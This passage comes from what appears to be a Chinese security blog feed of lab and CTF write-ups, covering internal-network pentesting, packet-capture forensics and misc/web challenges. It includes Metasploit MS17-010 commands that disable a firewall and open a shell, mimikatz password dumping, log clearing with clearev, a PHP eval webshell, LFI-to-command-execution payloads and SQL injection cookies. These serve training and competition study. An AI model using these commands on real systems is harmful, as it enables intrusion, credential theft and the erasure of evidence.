src="http://cdn.polowong.top/static/images/vs14.jpg"><p>使用ladon扫描内网</p><img src="http://cdn.polowong.top/static/images/vs15.jpg"><p>得到结果：</p><p>192.168.52.3 139 445 3389</p><p>192.168.52.138 80 445 139 389</p><p>192.168.52.141 21 139</p><p>192.168.52.138主机389端口开启了LDAP服务，可能是DC。</p><p>下面尝试添加路由，使用Windows7作为跳板机访问Windows2003</p><img src="http://cdn.polowong.top/static/images/vs16.jpg"><p>经尝试后可以ping通，可以顺利访问。</p><h2 id="渗透域内成员141"><a href="#渗透域内成员141" class="headerlink" title="渗透域内成员141"></a>渗透域内成员141</h2><p>使用nmap对目标主机进行扫描，尝试扫描SMB漏洞</p><img src="http://cdn.polowong.top/static/images/vs17.jpg"><p>发现漏洞，尝试利用</p><img src="http://cdn.polowong.top/static/images/vs18.jpg"><p>成功获取目标机器的shell。</p><p>load mimikatz</p><p>mimikatz_command -f samdump::hashes 获取主机的密码，这样就成功抓到了主机的用户名和NTML-hash值。</p><h2 id="渗透域控"><a href="#渗透域控" class="headerlink" title="渗透域控"></a>渗透域控</h2><p>使用nmap对目标ip进行扫描，发现MS17-010和MS08-067漏洞，这次尝试利用MS17-010进行攻击。</p><p>首先关闭防火墙</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">set command &quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>接下来获得一个正向shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>之后我用mimikatz抓密码出了点问题，报错mod_process::getVeryBasicModulesListForProcess : (0x0000012b)</p><p>搜了搜这个问题是因为mimikatz默认加载32位系统，但是我们的系统是64位的，所以首先要将meterpreter迁移到一个64位进程上。</p><p>PS一下，选择权限为NT AUTHORITY\SYSTEM权限的进程</p><p>migrate  pid  即可。</p><p>之后在用mimikatz抓密码就能抓到了。</p><img src="http://cdn.polowong.top/static/images/vs19.jpg"><p>攻击结束后使用clearev命令清除攻击痕迹。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>第一次完整地做内网渗透相关的练习，对内网渗透的过程不太熟悉，工具的使用也不熟悉，对一些概念性的基础问题也不太熟悉。。。希望能在后续的学习过程中不断完善这些方面。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://shavchen.github.io/vulstack-1-writeup/#%E6%B8%97%E9%80%8F%E5%9F%9F%E6%8E%A7">https://shavchen.github.io/vulstack-1-writeup/#%E6%B8%97%E9%80%8F%E5%9F%9F%E6%8E%A7</a></p><p><a href="https://www.freebuf.com/column/230476.html">https://www.freebuf.com/column/230476.html</a></p><p><a href="https://www.cnblogs.com/wkzb/p/12358076.html#scroller-14">https://www.cnblogs.com/wkzb/p/12358076.html#scroller-14</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>comprehensive traffic analysis</title>
      <link href="2020/11/30/comprehensive-traffic-analysis/"/>
      <url>2020/11/30/comprehensive-traffic-analysis/</url>
      
        <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="2019-8-安恒流量分析"><a href="#2019-8-安恒流量分析" class="headerlink" title="2019.8 安恒流量分析"></a>2019.8 安恒流量分析</h2><ol><li>某公司内网网络被黑客渗透，请分析流量，给出黑客使用的扫描器</li><li>某公司内网网络被黑客渗透，请分析流量，得到黑客扫描到的登陆后台是(相对路径即可)</li><li>某公司内网网络被黑客渗透，请分析流量，得到黑客使用了什么账号密码登陆了web后台(形式:username/password)</li><li>某公司内网网络被黑客渗透，请分析流量，得到黑客上传的webshell文件名是，内容是什么,提交webshell内容的base编码</li><li>某公司内网网络被黑客渗透，请分析流量，黑客在robots.txt中找到的flag是什么</li><li>某公司内网网络被黑客渗透，请分析流量，黑客找到的数据库密码是多少</li><li>某公司内网网络被黑客渗透，请分析流量，黑客在数据库中找到的hash_code是什么</li><li>某公司内网网络被黑客渗透，请分析流量，黑客破解了账号<a href="mailto:&#105;&#x6a;&#x6e;&#x75;&#64;&#116;&#101;&#x73;&#116;&#x2e;&#x63;&#x6f;&#109;">&#105;&#x6a;&#x6e;&#x75;&#64;&#116;&#101;&#x73;&#116;&#x2e;&#x63;&#x6f;&#109;</a>得到的密码是什么</li><li>某公司内网网络被黑客渗透，请分析流量，被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip</li><li>某公司内网网络被黑客渗透，请分析流量，黑客使用了什么账号登陆了mail系统（形式: username/password）</li><li>某公司内网网络被黑客渗透，请分析流量，黑客获得的vpn的ip是少</li></ol><h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>1.观察12281号包，看HTTP层的referrer，发现了AWVS的扫描器特征。</p><p>2.过滤http协议，发现/admin/login.php</p><p>3.过滤http协议，看86号包，发现了表单数据 username 人事 password hr123456（错误答案）</p><p>302跳转代表登陆成功</p><p>使用http contains “rec=login” and http.request.method==POST and ip.src==192.168.94.59 语句对webone进行过滤，将结果对时间进行排序，发现最后一个包中的username admin password admin!@#pass123</p><p>4.a.php 翻到最后发现了a.php 然后分组列表搜a.php 找POST包</p><p> Form item: “action” = “QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJb</p><p>使用 http contains “&lt;?php @eval”  过滤找一句话木马，但是没找到。</p><p>考虑TCP 重传可能导致http没追踪到，所以考虑使用tcp contains “&lt;?php @eval”</p><p>发现了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1234</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将其base64encode即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgQGV2YWwoJF9QT1NUWzEyMzRdKTs&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>5.搜字符串robots.txt 发现flag flag:87b7cb79481f317bde90c116cf36084b</p><p>6.找到webshell的名称后，一直跟踪webshell，看看她在做什么。数据包大概在734581。</p><p>后面会发现查看了数据库配置文件，就发现了数据库账号密码 dbuser web dbpass e667jUPvJjXHvEUv</p><p>7.在web2数据包中 过滤mysql协议 分组字节流搜索字符串hash_code 看response包发现hash_code d1c029893df40cb0f47bcf8f1c3c17ac</p><p>8.web2数据包中 过滤mysql协议 搜索字符串 <a href="mailto:&#105;&#106;&#x6e;&#x75;&#x40;&#116;&#101;&#x73;&#x74;&#46;&#x63;&#x6f;&#x6d;">&#105;&#106;&#x6e;&#x75;&#x40;&#116;&#101;&#x73;&#x74;&#46;&#x63;&#x6f;&#x6d;</a> ，看到md5加密的密码b78f5aa6e1606f07def6e839121a22ec，解密一下得到edc123!@#</p><p>9.追踪webshell包，发现了ifconfig命令。</p><p> -&gt;|eth0      Link encap:Ethernet  HWaddr 00:0C:29:CB:9F:85  \n</p><p>​          inet addr:192.168.32.189  Bcast:192.168.32.255  Mask:255.255.255.0\n</p><p>10.打开mailtwo数据包，过滤http流，发现第一个数据包里面的动作是登出，发现了用户名wenwenni。</p><p>然后看28号数据包的操作是访问登录页面，35号数据包发现了密码加密函数。</p><p>是AES-CBC加密，key为1234567812345678。</p><p>继续看42 44数据包，还是wenwenni用户登录，并且返回了 success true.</p><p>尝试使用如下过滤器过滤:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(http contains &quot;&#123;\&quot;success\&quot;:true&#125;&quot; or http.request.method&#x3D;&#x3D;&quot;POST&quot;) and ip.addr&#x3D;&#x3D;192.168.94.59</span><br></pre></td></tr></table></figure><p>发现到最后也没爆破成功（这题看的别人的思路，我没懂）</p><p>然后打开mailto1 继续使用上述语句过滤</p><p>发现18512登陆成功，则密码在17126号数据包中。+ZgE14UGcFcyRGLI0/ZXPQ==</p><p>密码为1234567812345678的MD5值，偏移量为1234567812345678</p><p>AES解密得admin!@#PASS123</p><p>11.第一个vpn数据包在尝试登录vpn，然后看第二个。</p><p>统计一下会话信息，发现10.3.4.3 10.3.4.96 10.3.4.55 这几个ip之间的通信较多，然后过滤看看。</p><p>过滤一下smb协议，发现10.3.4.96是SMB服务器。</p><p>然后在看一下55这个ip</p><p> ip.addr==10.3.4.55  </p><p>发现10.3.4.3首先ping了10.3.4.55 所以确定10.3.4.3是黑客使用的vpn服务器。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>对一些有手就行的过滤方法用的还可以，但是深入一点就不太行了 对一些流量动作的分析不太到位，对filter的用法也不太熟悉，比如\表转义。继续学习！</p><h2 id="待学习：PPTP协议、SMB协议"><a href="#待学习：PPTP协议、SMB协议" class="headerlink" title="待学习：PPTP协议、SMB协议"></a>待学习：PPTP协议、SMB协议</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/qq_43431158/article/details/107176918">https://blog.csdn.net/qq_43431158/article/details/107176918</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯misc全wp</title>
      <link href="2020/11/26/%E5%AE%89%E6%B4%B5%E6%9D%AFmisc%E5%85%A8wp/"/>
      <url>2020/11/26/%E5%AE%89%E6%B4%B5%E6%9D%AFmisc%E5%85%A8wp/</url>
      
        <content type="html"><![CDATA[<h1 id="密码学-爆破"><a href="#密码学-爆破" class="headerlink" title="密码学 爆破"></a>密码学 爆破</h1><p>SECRET是不知道的</p><p>flag是md5(SECRET).hexdigest()</p><p>已知部分flag为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d0g3&#123;71b2b5616**2a4639**7d979**de964c&#125;</span><br></pre></td></tr></table></figure><p>cipher是sha256加密后的flag，其摘要为</p><p>0596d989a2938e16bcc5d6f89ce709ad9f64d36316ab80408cb6b89b3d7f064a</p><p>现在不知道secret。</p><p>str1=”71b2b5616”</p><p>str2=”2a4639”</p><p>str3=”7d979”</p><p>str4=”de964c”</p><p>str1 2 3 4 之间分别有两位不知道 爆破的话需要爆破16^6次。</p><p>直接爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  hashlib</span><br><span class="line">broken_flag= <span class="string">&#x27;71b2b5616**2a4639**7d979**de964c&#x27;</span></span><br><span class="line">str1=<span class="string">&quot;d0g3&#123;71b2b5616&quot;</span></span><br><span class="line">str2=<span class="string">&quot;2a4639&quot;</span></span><br><span class="line">str3=<span class="string">&quot;7d979&quot;</span></span><br><span class="line">str4=<span class="string">&quot;de964c&#125;&quot;</span></span><br><span class="line">cipher=<span class="string">&#x27;0596d989a2938e16bcc5d6f89ce709ad9f64d36316ab80408cb6b89b3d7f064a&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdigest</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span>  hashlib.sha256(content).hexdigest()</span><br><span class="line">alphabet=<span class="string">&quot;1234567890abcdef&quot;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> alphabet:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> alphabet:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> alphabet:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> alphabet:</span><br><span class="line">                    <span class="keyword">for</span> f <span class="keyword">in</span> alphabet:</span><br><span class="line">                        string=str1+a+b+str2+c+d+str3+e+f+str4</span><br><span class="line">                        <span class="keyword">if</span> getdigest(string)==cipher:</span><br><span class="line">                            <span class="built_in">print</span> string</span><br></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>扫码套娃，然后得到一个flag.docx，里面一串乱码，而且公众号也提示了不是emojidecode，但是这玩意除了emojidecode还能是啥？</p><p>因为我的word2016无法显示emoji，然后我换成rar解压，在xml里面看到了emoji，放到在线解密工具即可。（师傅们直接复制过去就完事了）</p><h2 id="王牌特工"><a href="#王牌特工" class="headerlink" title="王牌特工"></a>王牌特工</h2><p>这道题一开始没啥思路，然后file看一下是ext3格式。网上搜了一篇教程就差不多出来了。</p><p><a href="https://blog.ihomura.cn/2018/08/03/WriteUp-ext3-%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D-HZ-file/">https://blog.ihomura.cn/2018/08/03/WriteUp-ext3-%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D-HZ-file/</a></p><p>工具：fsstat，ext3grep，veracrypt。</p><p>装ext3grep的时候，报错了按照网上说的做增添一些东西，我这还会报错，把最后报错的那一行注释掉就完事儿了。</p><p>首先使用fsstat看镜像信息。</p><p>fsstat findme</p><p>其中root directory比较重要（我也不知道为什么）</p><p>接下来使用ext3grep查看文件信息。</p><p>ext3grep –inode 2 findme</p><img src="http://cdn.polowong.top/static/images/misc2.png"><p>恢复这个东西</p><p>ext3grep –restore-file .coolboy.swp findme </p><p>vim -r .coolboy.swp</p><p>新建一个目录/root/coolboy 恢复完会放到这里面，base64解码后的内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">真的密码:this_is_a_true_key</span><br></pre></td></tr></table></figure><p>用这个密码使用veracrypt去挂载flagbox，就可以获得flag。</p><h2 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h2><p>一开始是hardzip，有个密码1，看文件比较短尝试CRC32爆破，爆破完的密码拼起来就是easyzip的解压密码。</p><p>解压下来easyzip，</p><p>通过伪加密拿到redeme.txt，尝试明文攻击。</p><p>这里需要注意的是，使用明文攻击需要保证待破解压缩包里只有一个文件，也就是已知文件。因为这里面有一个伪加密，其他文件的压缩算法可能与已知文件的不一致，所以为了保证顺利进行，需要将其他文件删除（这道题所需要，其他情况下如果加密方式都一样的话就不用删除。）</p><h2 id="misc4"><a href="#misc4" class="headerlink" title="misc4"></a>misc4</h2><p>npmtxt打开一看啥也不懂，010editor打开一看有看不懂的东西，搜了搜16进制慢慢搜就搜到了0宽隐写。</p><p>把那一串复制到<a href="https://yuanfux.github.io/zero-width-web/">https://yuanfux.github.io/zero-width-web/</a> </p><p>decode就可以获得解压密码</p><p>RealV1siBle</p><img src="http://cdn.polowong.top/static/images/misc4.png"><p>打开是张图，silenteye一把梭出来flag。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次比赛觉得web比较难，ssti没做出来比较上心。最近打算深度学习ssti相关内容，争取下次做出来！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>山东省新一代攻防赛wp</title>
      <link href="2020/11/23/%E5%B1%B1%E4%B8%9C%E7%9C%81%E6%96%B0%E4%B8%80%E4%BB%A3%E6%94%BB%E9%98%B2%E8%B5%9Bwp/"/>
      <url>2020/11/23/%E5%B1%B1%E4%B8%9C%E7%9C%81%E6%96%B0%E4%B8%80%E4%BB%A3%E6%94%BB%E9%98%B2%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>打聊城的比赛，又白给了，拿了参与奖，做出来两个misc，剩下两个misc都做了快一半，没思路了，特来复现。</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>打开之后是一个登陆页面，查看源码发现了测试账号test/test</p><p>查看robots.txt 发现php.php 发现是phpinfo。</p><p>登录之后发现可能存在LFI，然后上了下扫描器，扫到了一些文件，尝试包含info.php，得到源码，然后发现了include了template/info.html，于是访问。查看源码发现了hint m4nageee.php。然后读manage的源码，在源码中发现包含了2333.html，于是访问。</p><p>查看源码时发现了php代码，尝试PHP session文件包含。</p><p>但是需要session的存放位置，于是通过扫描到的php.php查看session日志的存放位置/var/lib/php5，遂包含之。</p><p>在m4nageee里面写nickname到session文件里面，利用LFI包含getshell。</p><p>当前我的phpsessid为0u335c2ud2h9gjq0lq6nos1i72</p><p>所以session文件就是/var/lib/php5/sess_0u335c2ud2h9gjq0lq6nos1i72,包含即可。</p><p>nikename里面写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> system(<span class="string">&quot;cat fla*&quot;</span>)； <span class="meta">?&gt;</span></span><br><span class="line"> 即可绕过对flag的过滤</span><br><span class="line"></span><br><span class="line">或者这样写</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&quot;cat fl\ag_0ba7bc92fcd57e337ebb9e74308c811f&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">等等。。</span><br></pre></td></tr></table></figure><h2 id="web2-web3"><a href="#web2-web3" class="headerlink" title="web2 web3"></a>web2 web3</h2><p>题目提示使用sqlmap注入，但是我注入巨拉跨。。而且数据库是sqlite的，我只会一点mysql的注入。。当时没做出来，赛后复现下。</p><p>这题是使用cookie注入。我明确地知道自己不会用sqlmap进行cookie注入。</p><h3 id="不会-跟官方的思路没复现出来，等wp。"><a href="#不会-跟官方的思路没复现出来，等wp。" class="headerlink" title="不会 跟官方的思路没复现出来，等wp。"></a>不会 跟官方的思路没复现出来，等wp。</h3><p>这里放下济大师傅的web2 web3的payload：</p><p>Cookie: PHPSESSID=da55nb2kgsge2luvc5m53k5r90; username=test; password=test’ OR 1=1 LIMIT 1 OFFSET 1 – </p><p>password=test’ OR 1=1 LIMIT 1 OFFSET 1 – ; userinfo=eyJ1c2VybmFtZSI6InRlc3QiLCJwYXNzd29yZCI6InRlc3QnIE9SIDE9MSBMSU1JVCAxIE9GRlNFVCAxIC0tICJ9Cg%3D%3D</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="ez-decode"><a href="#ez-decode" class="headerlink" title="ez_decode"></a>ez_decode</h2><p>简单的编码转换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#54;&amp;#54;&amp;#54;&amp;#99;&amp;#54;&amp;#49;&amp;#54;&amp;#55;&amp;#55;&amp;#98;&amp;#54;&amp;#54;&amp;#51;&amp;#57;&amp;#54;&amp;#52;&amp;#54;&amp;#54;&amp;#51;&amp;#53;&amp;#51;&amp;#52;&amp;#51;&amp;#48;&amp;#51;&amp;#49;&amp;#51;&amp;#48;&amp;#51;&amp;#48;&amp;#51;&amp;#56;&amp;#51;&amp;#51;&amp;#54;&amp;#50;&amp;#51;&amp;#48;&amp;#54;&amp;#54;&amp;#51;&amp;#49;&amp;#54;&amp;#54;&amp;#51;&amp;#50;&amp;#51;&amp;#51;&amp;#54;&amp;#49;&amp;#51;&amp;#51;&amp;#54;&amp;#53;&amp;#54;&amp;#49;&amp;#54;&amp;#53;&amp;#54;&amp;#51;&amp;#54;&amp;#51;&amp;#51;&amp;#53;&amp;#54;&amp;#52;&amp;#51;&amp;#53;&amp;#54;&amp;#49;&amp;#51;&amp;#55;&amp;#54;&amp;#51;&amp;#55;&amp;#100;</span><br></pre></td></tr></table></figure><p>html实体编码-&gt;hexo2string-&gt;flag</p><p>flag{f9df54010083b0f1f23a3eaecc5d5a7c}</p><h2 id="qr-code"><a href="#qr-code" class="headerlink" title="qr_code:"></a>qr_code:</h2><img src="http://cdn.polowong.top/static/images/qrcode.png"><p>打开很多二维码，盲猜扫出来内容转0和1</p><p>比赛的时候有个简单的读二维码的工具，但是批量不会写脚本。。就读了两个，看哪个是0哪个是1，然后bin2ascii就可以了。</p><p>用脚本的做法：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  -*-coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span>  os</span><br><span class="line"><span class="keyword">import</span>  zxing</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">reader=zxing.BarCodeReader()</span><br><span class="line">asc=<span class="string">&#x27;&#x27;</span></span><br><span class="line">path=<span class="string">&quot;C:\\Users\\Administrator\\Desktop\\聊城\\qrcode&quot;</span></span><br><span class="line">files=os.listdir(path)</span><br><span class="line"><span class="keyword">for</span> i  <span class="keyword">in</span>  <span class="built_in">range</span> (<span class="number">0</span>,<span class="built_in">len</span>(files)-<span class="number">1</span>):</span><br><span class="line">    <span class="comment"># try:</span></span><br><span class="line">    <span class="comment">#         content=reader.decode(file).raw</span></span><br><span class="line">    <span class="comment">#         if content==&quot;zero&quot;:</span></span><br><span class="line">    <span class="comment">#             asc+=str(0) #这是识别二维码的方法</span></span><br><span class="line">    <span class="comment">#         if content==&quot;one&quot;:</span></span><br><span class="line">    <span class="comment">#             asc+=str(1)</span></span><br><span class="line">    <span class="comment"># except:</span></span><br><span class="line">    <span class="comment">#     pass</span></span><br><span class="line">    size=os.path.getsize(<span class="built_in">str</span>(i)+<span class="string">&quot;.png&quot;</span>)</span><br><span class="line">   <span class="comment">#这是使用filesize做的方法</span></span><br><span class="line">    <span class="keyword">if</span> size==<span class="number">3409</span>:</span><br><span class="line">        asc+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        asc+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">asc=<span class="built_in">int</span>(asc,base=<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(asc)</span><br><span class="line">asc=<span class="built_in">hex</span>(asc)</span><br><span class="line">asc=asc[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(binascii.a2b_hex(asc).decode())</span><br></pre></td></tr></table></figure><p>flag{duyoulikeit}</p><h2 id="relax"><a href="#relax" class="headerlink" title="relax"></a>relax</h2><p>打开是个.flag结尾的文件，丢进010editor看见是PK开头，考虑zip，解压出来一个flag.txt 一个音频。</p><p>flagtxt里面的base64解出来啥也不是，于是继续看音频。</p><p>考虑音频隐写，在文件详细信息里面发现了一串base64,解码后打开mp3stego，输入这个密码，得到了一串fakeflag：</p><p>fakeflag{same_length_with_true_flaghh}</p><p>和真的长的一样呢，真真假假</p><p>后面就没思路了。</p><p>后来看师傅的wp说需要讲该字符串与之前解出来啥也不是的base64异或就可以得到flag。草。</p><p>上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  base64</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>) <span class="keyword">as</span>  f:</span><br><span class="line">    str1=f.readline()</span><br><span class="line">str1=base64.b64decode(str1)</span><br><span class="line">fakeflag=<span class="string">&quot;fakeflag&#123;same_length_with_true_flaghh&#125;&quot;</span>.encode()</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(fakeflag)):</span><br><span class="line">    tmp=fakeflag[i]^str1[i]</span><br><span class="line">    flag+=<span class="built_in">chr</span>(tmp)</span><br><span class="line"><span class="built_in">print</span>( flag)</span><br></pre></td></tr></table></figure><p>这里需要注意的是：encode()方法是str类型提供的，将其转换为byte类型。decode（）方法是将byte类型转化为str类型。之前我都是出错了就直接瞎encode，decode，咋对咋弄。。今天终于知道了。</p><p>flag：flag{9ff3a239027a7089237686b384862d33}</p><h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>base64套娃，光想着basecrack，结果直接卡死。。就是没想起来自己写脚本。</p><p>附上hxd的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&quot;base.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span>  f:</span><br><span class="line">    content=f.read()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        content=base64.b16decode(content).decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;b16&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(content)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content=base64.b32decode(content).decode()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;b32&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                content=base64.b64decode(content).decode()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;b64&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    content=base64.b85decode(content).decode()</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;b85&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>flag:flag{4b057431c3ee0c4f56d4dad18c352375}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>取证专题</title>
      <link href="2020/11/17/%E5%8F%96%E8%AF%81%E4%B8%93%E9%A2%98/"/>
      <url>2020/11/17/%E5%8F%96%E8%AF%81%E4%B8%93%E9%A2%98/</url>
      
